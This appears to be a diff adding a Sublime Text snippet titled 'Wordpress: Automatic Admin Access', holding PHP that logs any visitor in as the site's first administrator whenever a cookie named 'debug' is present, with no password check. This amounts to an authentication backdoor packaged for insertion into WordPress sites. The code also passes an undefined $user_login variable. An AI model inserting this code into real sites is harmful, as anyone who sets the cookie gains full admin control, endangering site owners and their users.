@@ -1,0 +1,28 @@
+<snippet>
+	<content><![CDATA[
+function login_admin() {
+
+  	\$username = get_users( array('role'=>'Administrator') )[0]
+  	            ->data->user_login;
+
+    if ( !is_user_logged_in() ) {
+        \$user = get_user_by('login', \$username );
+        \$user_id = \$user->ID;
+        wp_set_current_user( \$user_id, \$user_login );
+        wp_set_auth_cookie( \$user_id );
+        do_action( 'wp_login', \$user_login );
+    }  
+}
+
+if( isset( \$_COOKIE['debug'] ) ){
+	login_admin();
+}
+]]></content>
+<tabTrigger>login_admin</tabTrigger>
+<scope>source.php</scope>
+<description>Wordpress: Automatic Admin Access</description>
+	<!-- Optional: Set a tabTrigger to define how to trigger the snippet -->
+	<!--  -->
+	<!-- Optional: Set a scope to limit where the snippet will trigger -->
+	<!--  -->
+</snippet>
